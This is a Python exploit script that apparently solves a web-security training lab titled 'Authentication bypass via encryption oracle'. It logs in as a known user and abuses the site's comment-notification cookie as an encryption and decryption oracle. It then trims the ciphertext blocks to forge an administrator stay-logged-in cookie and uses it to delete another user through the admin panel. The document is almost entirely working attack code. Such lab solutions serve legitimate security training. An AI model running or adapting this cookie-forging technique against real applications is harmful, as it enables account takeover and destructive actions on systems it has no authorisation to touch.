# Authentication bypass via encryption oracle

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import base64
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_wiener(s, url):
	print('\n[+] Trying to connect to the application as Wiener...')
	login_path = url + '/login'
	r = s.get(login_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter', 'csrf': csrf_token, 'stay-logged-in': 'on'}
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		print('[+] Successfully connected as Wiener !')
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)

def get_timestamp(s, url):
	print('\n[+] Trying to post a comment to decrypt the timestamp part of the stay-logged-in cookie...')
	sli_cookie = s.cookies['stay-logged-in']
	post_path = url + '/post?postId=1'
	comment_path = url + '/post/comment'
	r = s.get(post_path)
	csrf_token = get_csrf_token(r)
	comment_data = {
		'csrf': csrf_token,
		'postId': '1',
		'comment': 'Oracle Encryption',
		'name': 'gwyo',
		'website': '',
		'email': 'gwyo@test.com'
	}
	cookies = {'notification': sli_cookie}
	r = s.post(comment_path, data=comment_data, cookies=cookies)
	response = re.search(rb'<header class="notification-header">\n(.*)</header>\n', r.text.encode()).group(1).decode().strip()
	print(response)
	timestamp = response.replace('wiener:', '')
	print(timestamp)
	return timestamp

def craft_cookie(s, url, timestamp):
	print('\n[+] Trying to post a comment to encrypt the timestamp with administator...')
	sli_cookie = s.cookies['stay-logged-in']
	post_path = url + '/post?postId=1'
	comment_path = url + '/post/comment'
	r = s.get(post_path)
	csrf_token = get_csrf_token(r)
	comment_data = {
		'csrf': csrf_token,
		'postId': '1',
		'comment': 'Oracle Encryption',
		'name': 'gwyo',
		'website': '',
		'email': 'xxxxxxxxxadministrator:' + timestamp
	}
	r = s.post(comment_path, data=comment_data)
	response = re.search(rb'<header class="notification-header">\n(.*)</header>\n', r.text.encode()).group(1).decode().strip()
	print(response)
	notif_cookie = s.cookies['notification']
	print(notif_cookie)
	decoded = base64.b64decode(urllib.parse.unquote(notif_cookie).encode())
	print(decoded)
	print(len(decoded))
	print(decoded[32:])
	cookie = urllib.parse.quote(base64.b64encode(decoded[32:]))
	print(cookie)
	return cookie

def delete_carlos(s, url, admin_cookie):
	print('\n[+] Trying to access to the Admin Panel...')
	s.cookies.clear()
	time.sleep(1)
	cookies = {'stay-logged-in': admin_cookie}
	admin_path = url + '/admin'
	delete_path = url + '/admin/delete?username=carlos'
	r = s.get(admin_path, cookies=cookies)
	time.sleep(1)
	if r.status_code == 200:
		print('\n[+] Trying to delete Carlos user...')
		r = s.get(delete_path, cookies=cookies)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Authentication bypass via encryption oracle')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = connect_as_wiener(s, url)
			timestamp = get_timestamp(s, url)
			admin_cookie = craft_cookie(s, url, timestamp)
			r = delete_carlos(s, url, admin_cookie)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
